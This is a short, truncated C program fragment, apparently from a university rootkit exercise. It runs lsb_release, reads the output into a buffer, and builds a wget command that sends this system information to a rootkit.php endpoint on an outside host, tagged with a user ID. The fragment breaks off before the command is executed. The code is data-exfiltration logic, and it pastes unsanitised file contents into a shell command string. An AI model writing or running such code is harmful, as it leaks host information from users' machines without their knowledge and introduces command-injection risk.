...
main (int argc, char **argv)
{
  ...
  /* Execute lsb_release in terminal and write output to file */
  system("lsb_release -a > LSBRelease.txt");

  /* Read in file and save to string */
  FILE    *textfile;
  char    *data;
  long    numbytes;
  textfile = fopen("LSBRelease.txt", "r");
  if(textfile == NULL)
        return 1;
  ...
  if(data == NULL)
        return 1;
  fread(data, sizeof(char), numbytes, textfile);
  
  fclose(textfile);

  /* Create command */
  char command[1000] = "wget -q \"https://andromeda.cs.virginia.edu/rootkit.php?userid=ylw4sj&data=";
  strcat(command, data);
  char quote[] = "\"";
